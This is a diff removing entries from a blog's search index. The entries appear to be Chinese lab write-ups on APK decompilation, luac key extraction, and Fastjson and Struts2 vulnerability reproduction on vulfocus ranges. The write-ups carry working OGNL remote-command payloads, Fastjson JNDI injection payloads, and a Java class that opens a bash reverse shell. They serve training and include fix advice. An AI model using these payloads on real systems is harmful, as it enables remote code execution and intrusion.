@@ -1,337 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>APP反编译-下载源码</title>
-    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</url>
-    <content><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol>
-<li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li>
-<li>解压<strong>dex2jar.jar</strong>文件</li>
-<li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li>
-<li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li>
-<li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote>
-<p>d2j-dex2jar.bat classes.dex</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p>
-<h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol>
-<li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li>
-<li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li>
-<li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li>
-</ol>
-]]></content>
-      <categories>
-        <category>APP渗透</category>
-      </categories>
-      <tags>
-        <tag>APP反编译</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>APP之反编译+目录结构+重新打包+重新签名</title>
-    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/</url>
-    <content><![CDATA[<h2 id="反编译和重新打包-apktool"><a href="#反编译和重新打包-apktool" class="headerlink" title="反编译和重新打包-apktool"></a>反编译和重新打包-apktool</h2><p>下载地址：<a href="https://ibotpeaches.github.io/Apktool/install/">https://ibotpeaches.github.io/Apktool/install/</a></p>
-<ol>
-<li>分别下载<strong>apktool.bat</strong>、<strong>apktool.jar</strong>，并把需要反编译的APP放在同一个目录中<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081604.png" alt="image"></li>
-<li>在cmd窗口下进入当前目录</li>
-<li>执行反编译命令，反编译后的文件默认输出在当前目录下的<strong>qipai</strong>文件夹<blockquote>
-<p>apktool d qipai.apk</p>
-</blockquote>
-</li>
-<li>重新打包，默认输出<strong>qipai.apk</strong>文件为当前目录<blockquote>
-<p>apktool b test</p>
-</blockquote>
-<a id="more"></a>
-<h2 id="APP目录结构"><a href="#APP目录结构" class="headerlink" title="APP目录结构"></a>APP目录结构</h2><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081605.png" alt="image"></li>
-<li><strong>AndroidManifest.xml</strong>：安卓应用程序的全局配置文件，参考文章<a href="http://blog.chinaunix.net/uid-9185047-id-3460344.html">AndroidManifest.xml配置文件详解 </a></li>
-<li><strong>assets</strong>:系统在编译的时候不会编译assets下的资源文件,也就是说dex文件不包含此目录下的文件（此处存放业务逻辑代码，luac加密，解密key存放于<strong>lib</strong>目录下的so文件）</li>
-<li><strong>classes.dex</strong>：源码文件</li>
-<li><strong>resources.arsc</strong>：包含了已被编译好的资源的二进制格式文件。</li>
-<li><strong>res</strong>：资源文件，主要存放图片、菜单、布局文件等</li>
-<li><strong>META-INF</strong>：apk的签名信息</li>
-</ol>
-<h2 id="APP重新签名"><a href="#APP重新签名" class="headerlink" title="APP重新签名"></a>APP重新签名</h2><p>参考文章：<a href="https://blog.csdn.net/lyq8479/article/details/6401093">Android应用程序签名详解</a></p>
-]]></content>
-      <categories>
-        <category>APP渗透</category>
-      </categories>
-      <tags>
-        <tag>APP反编译</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>luac的解密过程</title>
-    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="加密解密思路"><a href="#加密解密思路" class="headerlink" title="加密解密思路"></a>加密解密思路</h2><p>将后缀为.luac文件放入到apk文件中，那么在程序运行时，势必需要对.luac文件进行解密，然后再加载运行文件。那程序是如何知道我们在加密key呢？有两个猜想：</p>
-<ol>
-<li>加密key写入文件，程序在解密时先读取文件中的加密key，再解密。</li>
-<li>加密key与程序内部约定某个值。</li>
-</ol>
-<p>显然，第一种可以破解，可以再程序中找到解密的值。</p>
-<a id="more"></a>
-<h2 id="寻找加密sign和key"><a href="#寻找加密sign和key" class="headerlink" title="寻找加密sign和key"></a>寻找加密sign和key</h2><p>要反编译.luac文件，需要知道加密<strong>key</strong>和<strong>sign</strong>。</p>
-<ol>
-<li><p>寻找加密<strong>sign</strong>:用记事本打开某个.luac文件，文件开头的前几个字符即加密sign</p>
-<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081606.png" alt="image"></p>
-</li>
-<li><p>寻找加密<strong>key</strong></p>
-<ul>
-<li>下载<strong>Hex Workshop</strong>工具：<a href="https://hex-workshop.en.softonic.com/download">https://hex-workshop.en.softonic.com/download</a></li>
-<li>将<strong>lib\libgame.so</strong>文件拖入工具中</li>
-<li><strong>ctrl+f</strong>查找<strong>sign</strong>的值</li>
-<li><strong>sign</strong>附近相似的值就是<strong>key</strong>的值<h2 id="解密luac文件"><a href="#解密luac文件" class="headerlink" title="解密luac文件"></a>解密luac文件</h2></li>
-</ul>
-</li>
-<li><p>下载<strong>XXTEADecrypt</strong>：<a href="http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe">http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe</a><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081607.png" alt="image"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>APP渗透</category>
-      </categories>
-      <tags>
-        <tag>APP反编译</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Fastjson_1.2.24反序列化漏洞复现过程</title>
-    <url>/2020/08/08/Vulfocus%E9%9D%B6%E5%9C%BA/Fastjson_1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>FastJson 库是 Java 的一个 Json 库，其作用是将 Java 对象转换成 json 数据来表示，也可以将 json 数据转换成 Java 对象，使用非常方便，号称是执行速度最快的库。</p>
-<p>在 1.2.24 版本的 Fastjson 出现了一个反序列化的漏洞，fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set/get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
-<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>fastjson &lt;= 1.2.47</p>
-<a id="more"></a>
-<h2 id="漏洞复现过程"><a href="#漏洞复现过程" class="headerlink" title="漏洞复现过程"></a>漏洞复现过程</h2><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><ol>
-<li>搭建vulfocus漏洞环境</li>
-<li>启动“vulfocus/fastjson-cnvd_2017_02833”</li>
-</ol>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080801.png" alt="image"><br>3. 访问页面显示如下说明环境正常<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080802.png" alt="image"></p>
-<h3 id="特征判断"><a href="#特征判断" class="headerlink" title="特征判断"></a>特征判断</h3><p>可以通过DNS回显的方式检测后端是否使用Fastjson</p>
-<p>构造请求如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.3.130:59541</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 44</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure>
-<p>其他回显方式：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080803.png" alt="image"></p>
-<h3 id="fastjson1-2-47以下版本通杀poc："><a href="#fastjson1-2-47以下版本通杀poc：" class="headerlink" title="fastjson1.2.47以下版本通杀poc："></a>fastjson1.2.47以下版本通杀poc：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;f&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;asdfasfd&#x2F;&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line">age:11</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>其中{“@type”:”com.sun.rowset.JdbcRowSetImpl”, “dataSourceName”:”ldap://asdfasfd/“, “autoCommit”:true}也可以替换成其他利用链</p>
-</blockquote>
-<h3 id="攻击机环境配置"><a href="#攻击机环境配置" class="headerlink" title="攻击机环境配置"></a>攻击机环境配置</h3><h4 id="centos7服务器，可通外网"><a href="#centos7服务器，可通外网" class="headerlink" title="centos7服务器，可通外网"></a>centos7服务器，可通外网</h4><ol>
-<li><p>修改 java 恶意类代码保存为 TouchFile.java</p>
- <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">   static &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">          Runtime r &#x3D; Runtime.getRuntime();</span><br><span class="line">          Process p &#x3D; r.exec(new String[]&#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;1888 0&gt;&amp;1&quot;&#125;);</span><br><span class="line">          p.waitFor();</span><br><span class="line">       &#125; catch (Exception e) &#123;</span><br><span class="line">           &#x2F;&#x2F; do nothing</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p> 将恶意java代码上传到攻击机，并使用javac编译（需安装jdk1.8并配置环境变量）<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080804.png" alt="image"></p>
-</li>
-<li><p>使用 python -m SimpleHTTPServer 快速搭建http服务<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080805.png" alt="image"><br> 访问ip+1111端口号，证明http服务搭建正确<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080806.png" alt="image"><br> 服务器收到响应<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080807.png" alt="image"></p>
-</li>
-<li><p>开启ldap服务</p>
-<ul>
-<li><p>使用git下载<strong>marshalsec</strong>，mvn编译<strong>marshalsec</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mbechler&#x2F;marshalsec.git</span><br><span class="line">cd marshalsec&#x2F;</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure></li>
-<li><p>使用<strong>marshalsec</strong>开启ldap服务</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;ip:1111&#x2F;#TouchFile 9999</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080808.png" alt="image"></p>
-</li>
-<li><p>nc监听1888端口</p>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080809.png" alt="image"></p>
-</li>
-</ul>
-</li>
-<li><p>构造payload发送请求</p>
-</li>
-</ol>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080810.png" alt="image"><br>5. ldap服务收到请求<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080811.png" alt="image"><br>6. 监听的1888端口成功反弹shell，拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080812.png" alt="image"></p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ol>
-<li>升级Fastjson到最新版</li>
-<li>WAF拦截过滤请求包中的 @type, %u0040%u0074%u0079%u0070%u0065, \u0040type, \x04type等多种编码的autotype变形</li>
-<li>最少升级到1.2.48以上版本且关闭autotype选项</li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Fastjson</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-019 CVE-2013-4316复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li>
-<li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-029 CVE-2016-0785复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p>
-<a id="more"></a>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li>
-<li>POC利用</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-046 CVE-2017-5638复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
-<a id="more"></a>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
-<li><p>使用vulfocus启动环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081405.png" alt="image"></p>
-</li>
-<li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-052 CVE-2017-9805复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081410.png" alt="image"></p>
-</li>
-<li><p>使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081411.png" alt="image"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-048 CVE-2017-9791复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081407.png" alt="image"></p>
-</li>
-<li><p>随意输入内容，使用burp抓取“submit”的数据包</p>
-</li>
-<li><p>poc利用</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p>
-<p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-053 CVE-2017-12611复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081412.png" alt="image"></li>
-<li>利用POC</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li>burp抓包构造payload<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-057 CVE-2018-11776复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p>
-</li>
-<li><p>poc利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-059 CVE-2019-0230复现过程</title>
